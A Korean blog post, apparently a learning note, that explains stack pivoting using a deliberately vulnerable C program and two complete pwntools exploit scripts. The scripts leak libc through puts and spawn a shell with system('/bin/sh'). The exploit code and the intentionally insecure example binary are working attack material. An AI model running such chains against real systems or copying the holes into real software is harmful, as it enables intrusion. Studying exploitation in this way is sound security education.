---
tistoryBlogName: k0n9
tistoryTitle: stack pivot
tistoryVisibility: "3"
tistoryCategory: "0"
tistorySkipModal: true
tistoryPostId: "39"
tistoryPostUrl: https://k0n9.tistory.com/39
---
## stack pivoting이란?

ROP를 하고 싶은데 BOF가 ret까지만 덮을수 있을경우(overflow가 많이 나지 않은 경우)혹은 main으로 돌아갈 수 없는 경우에 하는 방법이다

## 공격방법

gadget을 이용해서 쓰기 가능한 공간에 Fake Stack을 구성해놓고 chaining하는 기법이다.

특정 영역에 값이 있거나 값을 쓸수 있을경우 SFP를 이용하여 스택을 옮기고 해당 부분의 코드를 실행한다. 즉 어떤 공간을 스택처럼 사용하는 것이다.

예를 들면 sfp에 bss주소를 넣고 read등의 함수를 사용한다. 그리고 leave_ret 가젯을 통해 rbp를 bss로 보내 bss를 스택처럼 사용한다. 그리고 ret으로 그 이후의 명령어들을 실행시킨다

#### 예제
```c
//gcc -o pivot pivot.c -fno-stack-protector -z now -no-pie
#include <stdio.h>
  
void setup_environment() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}
  
void tools(){
asm (
    "pop %r14;"
    "pop %r15;"
    "ret;"        
    "pop %rdx;"
    "ret;"
);
}

int loop = 0;

int main(){
	char buf[0x30];
	
	setup_environmnet();
	
	if(loop == 1)
	{
		puts("no loop");
		exit(-1);
	}
	loop = 1;
	
	read(0, buf, 0x70);

	return 0;
}
```

익스코드

```python
from pwn import *
import time

# context.log_level = 'debug' 

e = ELF('./pivot')
e1 = e.libc                             
p = process('./pivot')

leave = 0x401271
rdi = 0x401206

binsh_addr = next(e1.search(b"/bin/sh\\x00"))      #/bin/sh 주소 찾기

rsi_r15 = 0x401204
rdx = 0x401208
ret = 0x401207
bss = 0x404020
read_plt = 0x401080
put_plt = 0x401070
put_got = 0x403fd0

ex = b'a'*0x30
ex += p64(bss+0x100)
ex += p64(rdi)
ex += p64(0)
ex += p64(rsi_r15)
ex += p64(bss+0x100)
ex += p64(0)
ex += p64(read_plt)
ex += p64(leave)

p.send(ex)

ex2 = p64(bss+0x700)
ex2 += p64(ret)
ex2 += p64(rdi)
ex2 += p64(put_got)
ex2 += p64(put_plt)
ex2 += p64(rdi)
ex2 += p64(0)
ex2 += p64(rsi_r15)
ex2 += p64(bss+0x700)
ex2 += p64(0)
ex2 += p64(rdx)
ex2 += p64(0x40)
ex2 += p64(read_plt)
ex2 += p64(leave)

time.sleep(1)
p.send(ex2)

put_leak = u64(p.recv(6)+b"\\x00\\x00")

put_off = 0x80ed0

libc_base = put_leak - put_off

system = libc_base + 0x50d60 #얘는 system 오프셋

binsh = libc_base + binsh_addr

ex3 =  p64(0xdeadbeef)
ex3 += p64(ret)
ex3 += p64(rdi)
ex3 += p64(binsh)
ex3 += p64(system)

time.sleep(1)
p.send(ex3)

p.interactive()
```

1. (ex1)buf를 채움
2. sfp를 bss+0x100으로 채움
3. 가젯을 이용해 read함수를 실행하고 다음에 실행할 작업을 bss+0x100에다 적음
4. leave를 통해 rbp가 bss+0x100으로 감
5. ret에는 read함수를 위한 가젯이 있고 read함수에 두번째 입력
6. 입력후에 leave_ret 가젯, leave로 rbp를 처음 8byte(bss+0x700)로 보내버리고 ret으로 그 아래 명령어들 실행
7. (ex2) 처음 8byte는 다시 rbp를 보낼 주소를 적어야 함. 그러니 bss+0x700을 적음
8. 그리고 put함수로 put의 실제주소 구함
9. put의 실제주소 - put의 오프셋(vmmap을 이용한 오프셋 구하기) = libc_base
10. libc_base + system의 오프셋 = system의 실제 주소
11. search로 구한 /bin/sh의 주소 + libc_base = /bin/sh의 실제 주소
12. 그리고 다시 read함수 실행
13. leave로 rbp를 처음 8byte로 보냄(여기서는 이후 작업이 없으니 쓰레기 값(0xdeadbeef)로 채우고 ret으로 이후 명령어들 실행
14. (ex3) 처음 8byte는 이후 작업이 없으니 쓰레기로 채움
15. system 함수 실행


![](https://i.imgur.com/D8E0oOS.png)

가젯이 rdi밖에 없으면 아래와 같이 main의 read를 사용할 수도 있다.
```python
from pwn import *
import time
  
context.log_level = 'debug'
  
e = ELF('./pivot')
e1 = e.libc      
p = process('./pivot')
  
pause()
leave = 0x401271
rdi = 0x401206
  
binsh_addr = next(e1.search(b"/bin/sh\x00"))      #/bin/sh 주소 찾기
  
ret = 0x401207
bss = 0x404020
put_plt = 0x401070
put_got = 0x403fd0
read_plt = 0x0000000000401251
  
ex = b'a'*0x30
ex += p64(bss+0x100)
ex += p64(read_plt)
ex += p64(leave)
  
p.send(ex)
  
# pause()
  
ex2 = b'a'*0x30
ex2 += p64(bss+0x700)
ex2 += p64(rdi)
ex2 += p64(put_got)
ex2 += p64(put_plt)
  
ex2 += p64(read_plt)
ex2 += p64(leave)
  
time.sleep(1)
  
p.send(ex2)
  
put_leak = u64(p.recv(6)+b"\x00\x00")
  
 
put_off = 0x80ed0
  
libc_base = put_leak - put_off
  
system = libc_base + 0x50d60 #얘는 system 오프셋
  
binsh = libc_base + binsh_addr
  
ex3 = b'a'*0x30
ex3 += p64(0xdeadbeef)
ex3 += p64(ret)
ex3 += p64(rdi)
ex3 += p64(binsh)
ex3 += p64(system)
  
time.sleep(1)
p.send(ex3)
  
p.interactive()
```




### 예제_제공파일
나나중중
